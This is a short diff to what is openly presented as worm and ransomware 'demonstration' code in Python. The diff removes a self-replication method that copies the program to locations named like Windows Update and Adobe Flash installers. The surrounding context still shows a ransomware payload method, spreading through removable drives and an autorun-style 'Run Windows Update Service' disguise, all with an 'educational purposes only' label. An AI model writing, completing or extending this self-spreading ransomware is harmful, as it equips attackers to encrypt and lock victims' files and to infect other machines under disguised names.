@@ -46,19 +46,6 @@ action=Run Windows Update Service
                 except Exception:
                     pass
     
-    def replicate_self(self):
-        """Copy itself to multiple locations"""
-        locations = [
-            os.path.expanduser("~/AppData/Local/Temp/Windows_Update_Service.exe"),
-            os.path.expanduser("~/Documents/Adobe_Flash_Update.exe"),
-        ]
-        
-        for location in locations:
-            try:
-                shutil.copy2(self.current_file, location)
-            except Exception:
-                pass
-    
     def execute_ransomware_payload(self):
         """Execute the ransomware payload"""
         # Generate random password
@@ -132,7 +119,7 @@ action=Run Windows Update Service
     
     def create_worm_message(self):
         """Create worm demonstration message"""
-        message_content = f"""⚠️  WORM DEMONSTRATION ⚠️
+        message_content = f"""WORM DEMONSTRATION
 
 This computer ran a worm demonstration.
 
@@ -158,9 +145,6 @@ This is for educational purposes only.
     
     def start_spreading(self):
         """Main method to initiate the worm's spreading behavior"""
-        # Replicate on current system
-        self.replicate_self()
-        
         # Spread via removable drives
         self.spread_via_removable_drives()
         
